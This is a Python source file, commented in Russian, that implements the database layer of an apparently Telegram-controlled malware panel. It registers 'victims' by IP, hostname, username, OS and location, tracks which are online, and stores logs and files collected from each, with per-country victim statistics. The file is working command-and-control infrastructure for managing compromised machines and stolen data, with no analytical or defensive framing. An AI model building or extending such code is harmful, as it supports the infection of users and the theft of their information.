from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession
from sqlalchemy.orm import sessionmaker
from sqlalchemy import select, update, delete, func
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any
import os

from models import Base, User, Victim, LogEntry, FileEntry


class DatabaseManager:
    def __init__(self):
        # Берем DATABASE_URL из переменных окружения
        database_url = os.getenv("DATABASE_URL")
        if not database_url:
            raise ValueError("DATABASE_URL not set")

        # Для PostgreSQL async драйвера
        if database_url.startswith("postgresql://"):
            database_url = database_url.replace("postgresql://", "postgresql+asyncpg://", 1)

        # Создаем движок
        self.engine = create_async_engine(database_url, echo=False)

        # Создаем фабрику сессий
        self.async_session = sessionmaker(
            self.engine,
            class_=AsyncSession,
            expire_on_commit=False
        )

    async def init_db(self):
        """Инициализация таблиц"""
        async with self.engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)

    async def get_session(self) -> AsyncSession:
        """Получение сессии БД"""
        return self.async_session()

    # ========== User methods ==========
    async def get_or_create_user(self, telegram_id: int, username: str = None,
                                 first_name: str = None, last_name: str = None):
        """Получить или создать пользователя"""
        async with self.async_session() as session:
            result = await session.execute(
                select(User).where(User.telegram_id == telegram_id)
            )
            user = result.scalar_one_or_none()

            if not user:
                user = User(
                    telegram_id=telegram_id,
                    username=username,
                    first_name=first_name,
                    last_name=last_name,
                    is_admin=False  # По умолчанию не админ
                )
                session.add(user)
                await session.commit()
                await session.refresh(user)

            return user

    async def get_all_admins(self):
        """Получить всех админов"""
        async with self.async_session() as session:
            result = await session.execute(
                select(User).where(User.is_admin == True)
            )
            return result.scalars().all()

    # ========== Victim methods ==========
    async def register_victim(self, victim_data: Dict[str, Any]):
        """Регистрация новой жертвы или обновление существующей"""
        async with self.async_session() as session:
            victim_id = victim_data.get("victim_id")
            result = await session.execute(
                select(Victim).where(Victim.victim_id == victim_id)
            )
            victim = result.scalar_one_or_none()

            now = datetime.utcnow()

            if not victim:
                victim = Victim(
                    victim_id=victim_id,
                    ip_address=victim_data.get("ip_address"),
                    hostname=victim_data.get("hostname"),
                    username=victim_data.get("username"),
                    os_version=victim_data.get("os_version"),
                    country=victim_data.get("country"),
                    city=victim_data.get("city"),
                    first_seen=now,
                    last_seen=now,
                    is_online=True
                )
                session.add(victim)
                await session.commit()
                await session.refresh(victim)
            else:
                victim.last_seen = now
                victim.is_online = True
                await session.commit()

            return victim

    async def get_victim(self, victim_id: str):
        """Получить жертву по ID"""
        async with self.async_session() as session:
            result = await session.execute(
                select(Victim).where(Victim.victim_id == victim_id)
            )
            return result.scalar_one_or_none()

    async def get_all_victims(self, limit: int = 100, offset: int = 0):
        """Получить список всех жертв"""
        async with self.async_session() as session:
            result = await session.execute(
                select(Victim)
                .order_by(Victim.last_seen.desc())
                .limit(limit)
                .offset(offset)
            )
            return result.scalars().all()

    async def get_online_victims(self, minutes: int = 5):
        """Получить онлайн жертв (активных за последние N минут)"""
        cutoff = datetime.utcnow() - timedelta(minutes=minutes)
        async with self.async_session() as session:
            result = await session.execute(
                select(Victim).where(Victim.last_seen >= cutoff)
            )
            return result.scalars().all()

    async def update_victim_status(self, victim_id: str, is_online: bool):
        """Обновить статус онлайн"""
        async with self.async_session() as session:
            await session.execute(
                update(Victim)
                .where(Victim.victim_id == victim_id)
                .values(is_online=is_online, last_seen=datetime.utcnow())
            )
            await session.commit()

    # ========== Log methods ==========
    async def add_log(self, victim_id: str, log_type: str, content: str):
        """Добавить текстовый лог"""
        async with self.async_session() as session:
            # Получаем внутренний ID жертвы
            victim = await self.get_victim(victim_id)
            if not victim:
                raise ValueError(f"Victim {victim_id} not found")

            log_entry = LogEntry(
                victim_id=victim.id,
                log_type=log_type,
                content=content
            )
            session.add(log_entry)
            await session.commit()
            await session.refresh(log_entry)
            return log_entry

    async def get_victim_logs(self, victim_id: str, limit: int = 50):
        """Получить логи жертвы"""
        async with self.async_session() as session:
            victim = await self.get_victim(victim_id)
            if not victim:
                return []

            result = await session.execute(
                select(LogEntry)
                .where(LogEntry.victim_id == victim.id)
                .order_by(LogEntry.created_at.desc())
                .limit(limit)
            )
            return result.scalars().all()

    # ========== File methods ==========
    async def add_file_record(self, victim_id: str, filename: str, file_path: str,
                              file_size: int, file_type: str):
        """Добавить запись о файле"""
        async with self.async_session() as session:
            victim = await self.get_victim(victim_id)
            if not victim:
                raise ValueError(f"Victim {victim_id} not found")

            file_entry = FileEntry(
                victim_id=victim.id,
                filename=filename,
                file_path=file_path,
                file_size=file_size,
                file_type=file_type
            )
            session.add(file_entry)
            await session.commit()
            await session.refresh(file_entry)
            return file_entry

    async def get_victim_files(self, victim_id: str, file_type: str = None):
        """Получить файлы жертвы"""
        async with self.async_session() as session:
            victim = await self.get_victim(victim_id)
            if not victim:
                return []

            query = select(FileEntry).where(FileEntry.victim_id == victim.id)
            if file_type:
                query = query.where(FileEntry.file_type == file_type)

            result = await session.execute(query.order_by(FileEntry.created_at.desc()))
            return result.scalars().all()

    # ========== Stats methods ==========
    async def get_stats(self):
        """Получить статистику"""
        async with self.async_session() as session:
            # Общее количество жертв
            total_victims = await session.scalar(select(func.count(Victim.id)))

            # Онлайн жертв (за последние 5 минут)
            cutoff = datetime.utcnow() - timedelta(minutes=5)
            online_victims = await session.scalar(
                select(func.count(Victim.id)).where(Victim.last_seen >= cutoff)
            )

            # Количество логов
            total_logs = await session.scalar(select(func.count(LogEntry.id)))

            # Количество файлов
            total_files = await session.scalar(select(func.count(FileEntry.id)))

            # Жертвы по странам
            countries_query = await session.execute(
                select(Victim.country, func.count(Victim.id))
                .where(Victim.country.isnot(None))
                .group_by(Victim.country)
            )
            countries = {row[0]: row[1] for row in countries_query.all()}

            return {
                "total_victims": total_victims or 0,
                "online_victims": online_victims or 0,
                "total_logs": total_logs or 0,
                "total_files": total_files or 0,
                "countries": countries
            }